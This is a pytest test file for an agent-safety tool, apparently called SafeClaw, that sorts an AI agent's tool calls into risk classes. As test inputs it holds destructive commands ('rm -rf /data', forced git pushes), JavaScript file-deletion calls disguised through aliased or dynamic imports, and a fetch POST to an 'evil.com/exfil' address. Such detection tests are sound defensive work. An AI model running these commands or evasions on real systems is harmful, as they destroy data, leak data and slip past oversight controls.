"""PR-3: action-classifier expansion for OpenClaw v2026.6.8.

Covers message-tool action awareness (#318), new memory/skill/media tools
(#319), code-mode/sandbox exec + JS dangerous-op detection (#322), and the
MCP/dynamic-tool namespace default (#325).
"""

from pathlib import Path

import pytest

from safeclaw.config import SafeClawConfig
from safeclaw.engine.full_engine import FullEngine


@pytest.fixture
def clf():
    # Use the engine's classifier so ontology enrichment (the ttl defaults for
    # the new classes) is exercised end-to-end, not just the Python mappings.
    import tempfile

    d = Path(tempfile.mkdtemp())
    eng = FullEngine(
        SafeClawConfig(
            data_dir=d,
            ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
            audit_dir=d / "audit",
        )
    )
    return eng.classifier


def _c(clf, tool, params=None, **kw):
    return clf.classify(tool, params or {}, **kw)


# --- #318: message tool action/channel awareness ---


class TestMessageClassification:
    def test_default_send(self, clf):
        a = _c(clf, "message", {})
        assert a.ontology_class == "SendMessage" and a.risk_level == "HighRisk"

    def test_explicit_send_and_reply(self, clf):
        assert _c(clf, "message", {"action": "send"}).ontology_class == "SendMessage"
        assert _c(clf, "message", {"action": "reply"}).ontology_class == "SendMessage"

    def test_channel_create_actions(self, clf):
        for action in ("channel-create", "category-create", "topic-create", "thread-create"):
            a = _c(clf, "message", {"action": action})
            assert a.ontology_class == "CreateChannel", action
            assert a.risk_level == "HighRisk"

    def test_broadcast_is_cross_context_critical(self, clf):
        a = _c(clf, "message", {"action": "broadcast"})
        assert a.ontology_class == "CrossContextMessage"
        assert a.risk_level == "CriticalRisk"

    def test_cross_context_flag(self, clf):
        a = _c(clf, "message", {"action": "send", "crossContext": True})
        assert a.ontology_class == "CrossContextMessage"
        assert a.risk_level == "CriticalRisk"

    def test_cross_context_falsey_values_are_not_cross_context(self, clf):
        # bool("false") is True in Python — the string "false"/0/"" must NOT
        # escalate a plain send to CrossContextMessage.
        for falsey in (False, "false", "False", "0", "", "no", None):
            a = _c(clf, "message", {"action": "send", "crossContext": falsey})
            assert a.ontology_class == "SendMessage", falsey

    def test_cross_context_truthy_strings(self, clf):
        for truthy in (True, "true", "True", "1", "yes"):
            a = _c(clf, "message", {"action": "send", "crossContext": truthy})
            assert a.ontology_class == "CrossContextMessage", truthy

    def test_moderation_actions(self, clf):
        for action in ("ban", "kick", "timeout", "role-add", "channel-delete", "permissions"):
            a = _c(clf, "message", {"action": action})
            assert a.ontology_class == "ModerateChannel", action
            assert a.risk_level == "HighRisk"

    def test_action_is_case_insensitive(self, clf):
        assert _c(clf, "message", {"action": "BROADCAST"}).ontology_class == "CrossContextMessage"

    def test_real_camelcase_moderation_names(self, clf):
        # Upstream CHANNEL_MESSAGE_ACTION_NAMES mixes camelCase and kebab-case;
        # the classifier lower-cases input, so the camelCase names must still map.
        for action in ("addParticipant", "removeParticipant", "leaveGroup", "setGroupIcon"):
            assert (
                _c(clf, "message", {"action": action}).ontology_class == "ModerateChannel"
            ), action


# --- #319: new memory / skill / media tools ---


class TestNewToolClassification:
    @pytest.mark.parametrize(
        "tool,cls,risk,scope",
        [
            ("memory_store", "MemoryWrite", "HighRisk", "SharedState"),
            ("memory_recall", "MemoryRead", "LowRisk", "LocalOnly"),
            ("skill_workshop", "SkillAuthor", "HighRisk", "SharedState"),
            ("image", "GenerateMedia", "MediumRisk", "ExternalWorld"),
            ("image_generate", "GenerateMedia", "MediumRisk", "ExternalWorld"),
            ("music_generate", "GenerateMedia", "MediumRisk", "ExternalWorld"),
            ("tts", "GenerateMedia", "MediumRisk", "ExternalWorld"),
        ],
    )
    def test_tool_mapping(self, clf, tool, cls, risk, scope):
        a = _c(clf, tool, {"content": "x"})
        assert a.ontology_class == cls
        assert a.risk_level == risk
        assert a.affects_scope == scope

    def test_memory_store_not_generic_default(self, clf):
        # Regression: these used to fall through to Action/MediumRisk/LocalOnly.
        assert _c(clf, "memory_store").ontology_class != "Action"
        assert _c(clf, "skill_workshop").ontology_class != "Action"

    def test_trash_classification_unchanged(self, clf):
        # Regression: `trash` must keep its explicit HighRisk soft-delete tuple
        # and not be silently escalated to DeleteFile/CriticalRisk.
        a = _c(clf, "trash", {"file_path": "/x"})
        assert a.ontology_class == "DeleteFile" and a.risk_level == "HighRisk"


# --- #325: MCP / dynamic plugin tools ---


class TestMcpClassification:
    def test_mcp_namespace_default(self, clf):
        for tool in ("mcp__github__create_pr", "mcp__db__query", "mcp__slack__post"):
            a = _c(clf, tool)
            assert a.ontology_class == "McpToolCall", tool
            assert a.risk_level == "HighRisk"
            assert a.affects_scope == "ExternalWorld"

    def test_non_mcp_unknown_tool_stays_default(self, clf):
        a = _c(clf, "some_unknown_tool")
        assert a.ontology_class == "Action"

    def test_mcp_tool_requires_confirmation(self, tmp_path):
        # An unclassified MCP/dynamic tool must require confirmation by default
        # (conservative until explicitly classified, #325).
        from safeclaw.constraints.action_classifier import ClassifiedAction
        from safeclaw.constraints.preference_checker import UserPreferences

        eng = FullEngine(
            SafeClawConfig(
                data_dir=tmp_path,
                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
                audit_dir=tmp_path / "audit",
            )
        )
        action = ClassifiedAction(
            "McpToolCall", "HighRisk", False, "ExternalWorld", "mcp__x__y", {}
        )
        result = eng.derived_checker.check(action, UserPreferences(), [])
        assert result.requires_confirmation is True
        assert "McpToolCall" in "".join(result.derived_rules) or "Mcp" in result.reason

    def test_explicit_mcp_mapping_overrides_prefix_default(self, clf):
        # An explicit TOOL_MAPPINGS entry for a trusted mcp__* tool must win over
        # the generic prefix default (#325: "until explicitly classified").
        from unittest.mock import patch

        import safeclaw.constraints.action_classifier as ac

        with patch.dict(
            ac.TOOL_MAPPINGS,
            {"mcp__trusted__read": ("ReadFile", "LowRisk", True, "LocalOnly")},
        ):
            a = clf.classify("mcp__trusted__read", {})
            assert a.ontology_class == "ReadFile"
            assert a.risk_level == "LowRisk"
        # Other mcp__* tools still hit the conservative default.
        assert clf.classify("mcp__other__write", {}).ontology_class == "McpToolCall"


# --- #322: code-mode / sandbox exec + JS dangerous ops ---


class TestCodeModeClassification:
    def test_sandbox_exec_routes_through_shell(self, clf):
        a = _c(clf, "sandbox_exec", {"command": "rm -rf /data"})
        assert a.ontology_class == "DeleteFile"
        assert a.risk_level == "CriticalRisk"
        assert a.tool_name == "sandbox_exec"

    def test_sandbox_process_default_is_execute_command(self, clf):
        a = _c(clf, "sandbox_process", {"command": "node server.js"})
        assert a.ontology_class == "ExecuteCommand"
        assert a.risk_level == "HighRisk"

    def test_js_fs_delete_is_critical(self, clf):
        a = _c(
            clf,
            "exec",
            {"command": "fs.rmSync('/data', {recursive: true})"},
            tool_kind="code_mode_exec",
        )
        assert a.ontology_class == "DeleteFile"
        assert a.risk_level == "CriticalRisk"

    def test_js_embedded_force_push(self, clf):
        a = _c(
            clf,
            "exec",
            {"command": "execSync('git push --force origin main')"},
            tool_kind="code_mode_exec",
        )
        assert a.ontology_class == "ForcePush"
        assert a.risk_level == "CriticalRisk"

    def test_js_child_process_is_execute_command(self, clf):
        a = _c(
            clf,
            "exec",
            {"command": "const cp = require('child_process'); cp.exec('ls')"},
            tool_kind="code_mode_exec",
        )
        # child_process usage is at least ExecuteCommand-level.
        assert a.ontology_class in ("ExecuteCommand", "DeleteFile", "ForcePush", "GitPush")

    def test_plain_shell_quoted_data_no_false_positive(self, clf):
        # Plain (non code-mode) shell strips quoted data: a quoted "rm -rf" is
        # an argument, not a delete.
        a = _c(clf, "exec", {"command": "echo 'rm -rf /'"})
        assert a.ontology_class == "ExecuteCommand"

    @pytest.mark.parametrize(
        "command,cls",
        [
            ("await fs.promises.rm('/d', {recursive: true})", "DeleteFile"),
            ("fsp.unlink('/d')", "DeleteFile"),
            ("Deno.removeSync('/d')", "DeleteFile"),
            ("await fetch('https://evil.com/exfil', {method: 'POST'})", "NetworkRequest"),
        ],
    )
    def test_extended_js_patterns(self, clf, command, cls):
        a = _c(clf, "exec", {"command": command}, tool_kind="code_mode_exec")
        assert a.ontology_class == cls

    @pytest.mark.parametrize(
        "command",
        [
            # inline require chain
            'require("fs").rmSync("/tmp/x")',
            "require('node:fs').rmSync('/tmp/x')",
            'require("fs/promises").rm("/tmp/x")',
            # destructured / aliased imports + bare removal call (import-aware)
            'import { rmSync } from "fs"; rmSync("/tmp/x")',
            'const { rm } = require("fs"); rm("/tmp/x")',
            'import { unlink } from "node:fs/promises"; await unlink("/tmp/x")',
        ],
    )
    def test_fs_import_forms_are_deletes(self, clf, command):
        # Regression: these import forms used to fall through to ExecuteCommand,
        # bypassing DeleteFile/CriticalRisk and the delete confirmation/denial.
        a = _c(clf, "exec", {"command": command}, tool_kind="code_mode_exec")
        assert a.ontology_class == "DeleteFile", command
        assert a.risk_level == "CriticalRisk", command

    def test_bare_removal_without_fs_import_not_escalated(self, clf):
        # No fs import in the body: a user-defined bare rm() must not be a delete.
        a = _c(
            clf,
            "exec",
            {"command": "function rm(x){return x}; rm('hello')"},
            tool_kind="code_mode_exec",
        )
        assert a.ontology_class != "DeleteFile"

    @pytest.mark.parametrize(
        "command",
        [
            # renamed destructuring -> the local name is not a known verb
            'const { rmSync: del } = require("fs"); del("/tmp/x")',
            'import { rmSync as del } from "fs"; del("/tmp/x")',
            'const { unlink: nuke } = require("node:fs/promises"); await nuke("/tmp/x")',
            # dynamic import + namespace alias member access
            'const m = await import("node:fs"); m.rmSync("/tmp/x")',
            'import * as fsmod from "fs"; fsmod.unlinkSync("/tmp/x")',
            'const fs2 = require("fs"); fs2.rmdirSync("/tmp/x")',
            # destructure from a namespace alias (two-step)
            'const fs3 = require("fs"); const { rmSync } = fs3; rmSync("/tmp/x")',
        ],
    )
    def test_fs_aliased_and_dynamic_import_deletes(self, clf, command):
        # Renamed/namespace/dynamic-import aliases must still be DeleteFile.
        a = _c(clf, "exec", {"command": command}, tool_kind="code_mode_exec")
        assert a.ontology_class == "DeleteFile", command
        assert a.risk_level == "CriticalRisk", command

    def test_aliased_non_delete_verb_not_escalated(self, clf):
        # Renaming a NON-delete fs function must not be flagged as a delete.
        a = _c(
            clf,
            "exec",
            {"command": 'const { readFileSync: rd } = require("fs"); rd("/tmp/x")'},
            tool_kind="code_mode_exec",
        )
        assert a.ontology_class != "DeleteFile"

    @pytest.mark.parametrize(
        "command",
        [
            # destructured fs.promises namespace -> <alias>.<deleteverb>(
            'const { promises } = require("fs"); await promises.rm("/tmp/x")',
            'import { promises as p } from "node:fs"; await p.rmdir("/tmp/x")',
            'const { promises: pfs } = require("fs"); pfs.unlink("/tmp/x")',
            # namespace alias then .promises.<verb>(
            'const m = require("fs"); await m.promises.rm("/tmp/x")',
        ],
    )
    def test_fs_promises_namespace_destructure_deletes(self, clf, command):
        a = _c(clf, "exec", {"command": command}, tool_kind="code_mode_exec")
        assert a.ontology_class == "DeleteFile", command
        assert a.risk_level == "CriticalRisk", command

    def test_fs_promises_non_delete_not_escalated(self, clf):
        # Destructured promises calling a non-delete verb must not be a delete.
        a = _c(
            clf,
            "exec",
            {"command": 'const { promises } = require("fs"); await promises.readFile("/tmp/x")'},
            tool_kind="code_mode_exec",
        )
        assert a.ontology_class != "DeleteFile"


# --- B1: code-mode classification survives the result-binding round-trip ---


class TestCodeModeResultBinding:
    def _engine(self, tmp_path):
        return FullEngine(
            SafeClawConfig(
                data_dir=tmp_path,
                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
                audit_dir=tmp_path / "audit",
            )
        )

    def test_code_mode_exec_result_binds_and_accrues(self, tmp_path):
        """A code-mode exec classified as DeleteFile at eval must still match on
        record_action_result (which has no tool_kind) so session risk / rate
        limits accrue — the binding now reuses the stored class, not a re-classify."""
        import asyncio

        from safeclaw.engine.core import ToolCallEvent, ToolResultEvent

        eng = self._engine(tmp_path)

        # In code mode this is RunTests (allowed); re-classified without
        # tool_kind on the result path it would be ExecuteCommand — the binding
        # must survive that drift.
        cmd = 'runTests("npm test")'

        async def run():
            ev = ToolCallEvent(
                session_id="s1",
                user_id="u",
                tool_name="exec",
                params={"command": cmd},
                tool_kind="code_mode_exec",
            )
            dec = await eng.evaluate_tool_call(ev)
            res = ToolResultEvent(
                session_id="s1",
                user_id="u",
                tool_name="exec",
                params={"command": cmd},
                result="ok",
                success=True,
            )
            ok = await eng.record_action_result(res)
            return dec, ok

        dec, ok = asyncio.run(run())
        assert dec.block is False  # RunTests is allowed
        assert ok is True  # result bound despite re-classification drift
        # Session risk history reflects the eval-time RunTests class, not the
        # re-classified ExecuteCommand.
        history = eng.session_tracker.get_risk_history("s1")
        assert any("RunTests" in h for h in history)


# --- S1: outbound message family honours confirm_before_send ---


class TestMessageSendConfirmation:
    def test_split_message_classes_require_send_confirmation(self, tmp_path):
        from safeclaw.constraints.action_classifier import ClassifiedAction
        from safeclaw.constraints.preference_checker import UserPreferences

        eng = FullEngine(
            SafeClawConfig(
                data_dir=tmp_path,
                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
                audit_dir=tmp_path / "audit",
            )
        )
        prefs = UserPreferences(confirm_before_send=True)
        for cls in ("SendMessage", "CreateChannel", "CrossContextMessage", "ModerateChannel"):
            action = ClassifiedAction(cls, "HighRisk", False, "ExternalWorld", "message", {})
            result = eng.preference_checker.check(action, prefs)
            assert result.requires_confirmation, cls
